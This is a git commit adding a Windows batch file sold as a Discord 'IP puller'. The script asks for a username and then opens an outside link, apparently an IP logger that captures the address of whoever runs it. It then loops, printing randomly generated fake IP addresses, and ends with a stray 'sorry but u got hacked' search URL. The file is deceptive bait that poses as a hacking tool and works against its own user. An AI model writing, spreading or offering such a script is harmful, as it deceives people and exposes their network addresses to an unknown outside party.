b9a22d9f8ae9dfc36b0ff37a5a715360a5c441bb
UseFullHacks <damon161411@gmail.com>
2025-06-28 04:02:54 +0200

    Add files via upload

---
+++ ip puller v1.29.bat
@@ -0,0 +1,13 @@
+@echo off
+cls
+:generate
+set /p userInput=enter discord username and hit enter to log ip:
+start https://mymap.icu/72CP7N
+set /a oct1=%random% %% 256
+set /a oct2=%random% %% 256
+set /a oct3=%random% %% 256
+set /a oct4=%random% %% 256
+echo %oct1%.%oct2%.%oct3%.%oct4%
+goto generate
+pause
+https://www.google.com/search?q=sorry+but+u+got+hacked&oq=sorry+but+u+got+hacked&gs_lcrp=EgZjaHJvbWUyCQgAEEUYORigATIHCAEQIRigATIHCAIQIRigATIHCAMQIRigAdIBCDMwMzhqMGo0qAIAsAIB&sourceid=chrome&ie=UTF-8
